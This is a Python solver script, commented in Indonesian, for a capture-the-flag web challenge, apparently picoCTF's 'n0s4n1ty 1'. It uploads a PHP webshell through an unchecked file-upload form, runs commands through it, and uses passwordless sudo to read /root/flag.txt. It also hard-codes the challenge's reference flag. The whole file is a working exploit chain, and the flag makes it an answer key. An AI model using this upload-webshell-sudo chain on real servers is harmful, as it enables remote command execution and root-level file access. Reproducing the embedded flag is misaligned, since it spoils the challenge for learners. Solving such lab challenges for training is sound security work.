#!/usr/bin/env python3
"""Solver for Challenge 482: n0s4n1ty 1 (Web Exploitation, picoCTF 2025).

Reproduksi audit NIST SP 800-115: upload file PHP tanpa sanitasi ekstensi
-> webshell di /uploads/sh.php -> sudo NOPASSWD ALL -> flag di /root/flag.txt.
Butuh instance lab aktif; BASE_URL dilewatkan via argumen/ENV.
"""
import sys
import urllib.request
import urllib.parse

FLAG_HINT = "academy{wh47_c4n_u_d0_wPHP_12aa2ff5}"


def run_cmd(base: str, cmd: str) -> str:
    url = base.rstrip("/") + "/uploads/sh.php?c=" + urllib.parse.quote(cmd)
    with urllib.request.urlopen(url, timeout=25) as resp:
        return resp.read().decode(errors="ignore").strip()


def solve(base_url: str) -> str:
    payload = b'<?php system($_GET["c"]); ?>'
    boundary = "----NyawitBoundary482"
    body = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"fileToUpload\"; "
        f'filename="sh.php"\r\nContent-Type: application/x-php\r\n\r\n'
    ).encode() + payload + (
        f"\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n"
        f"Upload File\r\n--{boundary}--\r\n"
    ).encode()
    req = urllib.request.Request(
        base_url.rstrip("/") + "/upload.php", data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    with urllib.request.urlopen(req, timeout=30) as resp:
        out = resp.read().decode(errors="ignore")
    assert "has been uploaded" in out, f"upload gagal: {out[:200]}"
    flag = run_cmd(base_url, "sudo cat /root/flag.txt")
    assert flag.startswith("academy{"), f"flag tak terduga: {flag[:80]}"
    return flag


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("pakai: solve_482_n0s4n1ty_1.py <lab-base-url>")
        print(f"flag referensi run 2026-10-28: {FLAG_HINT}")
        sys.exit(2)
    print("Flag:", solve(sys.argv[1]))
